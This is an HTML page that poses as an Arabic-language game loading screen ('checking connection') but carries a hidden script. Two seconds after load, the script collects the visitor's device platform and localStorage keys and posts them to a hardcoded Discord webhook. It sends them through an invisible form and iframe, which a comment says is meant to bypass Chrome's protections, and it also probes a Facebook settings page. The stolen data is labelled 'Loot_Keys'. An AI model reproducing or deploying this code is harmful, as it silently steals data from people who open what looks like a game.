<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
        .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* شاشة كشف الأخطاء */
        #debug-console { font-size: 10px; color: #00ff00; margin-top: 20px; width: 80%; word-break: break-all; text-align: left; }
    </style>
</head>
<body>
    <div class="version-marker">12</div>
    <div class="loader"></div>
    <p>جاري فحص الاتصال (V1.2.4)...</p>
    <div id="debug-console">Initializing...</div>

    <iframe name="hidden_receiver" style="display:none;"></iframe>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
        const consoleDiv = document.getElementById('debug-console');

        function localLog(msg) {
            consoleDiv.innerHTML += "<br>> " + msg;
            console.log(msg);
        }

        // الطريقة الأقوى لتجاوز حماية كروم: Form Submission
        function forceExfiltrate(title, content) {
            try {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = WEBHOOK_URL;
                form.target = 'hidden_receiver'; // الإرسال داخل الـ iframe عشان ما تفتح صفحة جديدة

                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'payload_json';
                input.value = JSON.stringify({
                    content: `📟 **[${title}]**\n${content}`
                });

                form.appendChild(input);
                document.body.appendChild(form);
                form.submit();
                document.body.removeChild(form);
                localLog("Attempted send: " + title);
            } catch (e) {
                localLog("Form Error: " + e.message);
            }
        }

        async function runDiagnostic() {
            localLog("Starting mission...");
            
            try {
                // 1. فحص الوصول لديسكورد
                localLog("Testing Webhook connectivity...");
                forceExfiltrate("Diagnostic", "Device: " + navigator.platform);

                // 2. محاولة سحب الـ Storage
                localLog("Checking LocalStorage...");
                let keys = Object.keys(localStorage).join(", ");
                if (keys) {
                    forceExfiltrate("Loot_Keys", "Keys found: " + keys);
                    localLog("Found keys: " + keys);
                } else {
                    localLog("LocalStorage is empty.");
                }

                // 3. اختبار الـ Requests الخلفية
                localLog("Triggering background proxy...");
                const img = new Image();
                img.src = "https://mbasic.facebook.com/settings?v=" + Math.random();
                img.onerror = () => localLog("FB Probe blocked or offline.");
                img.onload = () => localLog("FB Probe success!");

            } catch (err) {
                localLog("Global Error: " + err.message);
            }
        }

        // انتظر 2 ثانية ثم ابدأ
        setTimeout(runDiagnostic, 2000);
    </script>
</body>
</html>
